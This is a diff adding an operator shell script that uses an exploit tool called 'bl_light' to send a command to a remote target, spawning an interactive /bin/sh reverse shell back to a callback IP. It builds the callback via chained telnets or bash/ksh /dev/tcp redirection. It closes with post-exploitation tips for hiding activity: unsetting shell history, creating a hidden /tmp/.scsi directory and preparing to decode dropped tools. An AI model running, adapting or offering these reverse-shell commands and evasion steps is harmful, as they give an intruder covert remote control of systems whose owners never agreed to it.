@@ -1,0 +1,153 @@
+#!/bin/sh
+VER=1.0.0.1
+##########################################################
+### Generate & run a shell callback (via doublet telnet) on target.
+##########################################################
+
+# Some default values
+CALLBACK_PORT_IN=`mkrandom -n 2>/dev/null`
+CALLBACK_PORT_OUT=`mkrandom -n 2>/dev/null`
+while [ 1 ] ; do 
+    [ "$CALLBACK_PORT_IN" = "$CALLBACK_PORT_OUT" ] && CALLBACK_PORT_OUT=`mkrandom -n 2>/dev/null`
+    [ "$CALLBACK_PORT_IN" = "$CALLBACK_PORT_OUT" ] || break
+done
+
+[ "$CALLBACK_PORT_IN" ] || CALLBACK_PORT_IN=32177
+[ "$CALLBACK_PORT_OUT" ] || CALLBACK_PORT_OUT=32178
+
+PROGNAME=`basename $0`
+
+usage() {
+    echo $PROGNAME v.$VER
+    [ "$1" = "v" ] && exit 1
+    cat <<EOF
+
+$PROGNAME uses bl_light to start a callback on the remote target
+using one or two ports (to a doublet). The remote command will be
+shown, and if you do not abort, bl_light will try to send it to the
+target. If it is executed, it will cause an interactive /bin/sh shell
+to call back to the one or two ports. With the -t option, the remote
+command will be with two telnets. With -k or -b, it tries via /dev/tcp
+to a single local port. With -k, it tries via "ksh -c" (usually Solaris),
+with -b it uses bash (usually the rest).
+
+Prior to sending the exploit, you should run this locally in a
+scripted window:
+
+   doublet CALLBACK_PORT_IN CALLBACK_PORT_OUT
+
+Usage: ${0} [options]
+  -i <target ip>          (required)
+  -l <callback ip>        (required)
+  -p <callback port 1>    (for stdin, first given to doublet, def. random)
+  -P <callback port 2>    (for stdout, second given to doublet, def. random)
+  -b                      (use bash+/dev/tcp remotely, second port not used)
+  -k                      (use ksh+/dev/tcp remotely, second port not used)
+  -t                      (use two telnets, BOTH ports used)
+EOF
+
+    [ "$*" ] && echo -e "\a\n\nERROR: $*\n"
+    exit 1
+}
+
+# There must be at least one argument
+if [ ${#} -eq 0 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+USE_KSH_TCP=""
+USE_BASH_TCP=""
+    while getopts i:p:hvl:P:kbt op; do
+        case $op in
+	h|v) usage $op;;
+        i)  TARGET_IP="$OPTARG";;
+	l)  CALLBACK_IP="$OPTARG";;
+	p)  CALLBACK_PORT_IN="$OPTARG";;
+	P)  CALLBACK_PORT_OUT="$OPTARG";;
+	k)  USE_KSH_TCP=yes;;
+	b)  USE_BASH_TCP=yes;;
+	t)  USE_TELNET="-t";;
+        esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+# Check for required args
+[ -z "$TARGET_IP" ] && echo "Error: missing remote IP -i argument" && usage
+[ -z "$CALLBACK_PORT_IN" ] && echo "Error: missing remote port -p argument" && usage
+[ -z "$CALLBACK_PORT_OUT" ] && echo "Error: missing remote port -P argument" && usage
+echo "$USE_TELNET$USE_KSH_TCP$USE_BASH_TCP" | grep -q "yesyes" && usage "Cannot use more than one of -t, -k, -b"
+[ "$USE_TELNET" ] || CALLBACK_PORT_OUT=""
+
+if [ "${TARGET_IP:0:3}" = "127" ] ; then
+    echo -e "For your NOPEN tunnel window:\n"
+    echo -e "r $CALLBACK_PORT_IN"
+    [ "$USE_TELNET" ] && echo -e "r $CALLBACK_PORT_OUT"
+fi
+
+echo -e "\n\nFor the shell callback (doublet requires a scripted window)"
+echo -e "\n   doublet $USE_TELNET $CALLBACK_PORT_IN $CALLBACK_PORT_OUT\n"
+
+# Listener respawns for ten minutes
+RUN_WHAT="exec \\\"/bin/sh\\\""
+
+if [ "$USE_TELNET" ] ; then
+    CMD="sleep 300 | (telnet $CALLBACK_IP $CALLBACK_PORT_IN 2>&1 ; sleep 1) | /bin/sh 2>&1 | telnet $CALLBACK_IP $CALLBACK_PORT_OUT 2>&1"
+    CMD="\\(telnet $CALLBACK_IP $CALLBACK_PORT_IN 2>&1 ; sleep 1\\) | /bin/sh 2>&1 | telnet $CALLBACK_IP $CALLBACK_PORT_OUT 2>&1"
+    CMD="TERM=vt100;export TERM;telnet $CALLBACK_IP $CALLBACK_PORT_IN 2>&1  | /bin/sh 2>&1 | telnet $CALLBACK_IP $CALLBACK_PORT_OUT 2>&1"
+# These below work:
+    CMD="sh -c \"sleep 300 | (telnet $CALLBACK_IP $CALLBACK_PORT_IN 2>&1 ; sleep 1) | /bin/sh 2>&1 | telnet $CALLBACK_IP $CALLBACK_PORT_OUT 2>&1\""
+    CMD="sh -c \"telnet $CALLBACK_IP $CALLBACK_PORT_IN 2>&1 < /dev/console | /bin/sh 2>&1 | telnet $CALLBACK_IP $CALLBACK_PORT_OUT 2>&1\""
+fi
+
+if [ "$USE_KSH_TCP" ] ; then
+    CMD="/bin/ksh -c \"/bin/sh < /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT_IN >&0 2>&0\""
+fi
+if [ "$USE_BASH_TCP" ] ; then
+    CMD="/bin/bash < /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT_IN >&0 2>&0"
+fi
+
+
+    
+echo -e "Remote callback command will be: +$CMD+"
+
+cat <<EOF
+
+About to run this (but do NOT try pasting this...something wrong escapes-wise....):
+
+bl_light ${TARGET_IP} "$CMD"
+
+You can abort here with ^C, hit return to continue.
+
+EOF
+
+read blah
+
+echo "now running it..."
+
+./bl_light ${TARGET_IP} "$CMD"
+
+
+echo "Sent. Thank you for playing"
+
+cat <<EOF
+
+These might come in handy:
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+w
+id
+uname -a
+ls -la /boot
+mkdir /tmp/.scsi;cd /tmp/.scsi;pwd
+which uudecode uncompress
+        # gedit sendmail
+uudecode; ls -la
+
+EOF
+
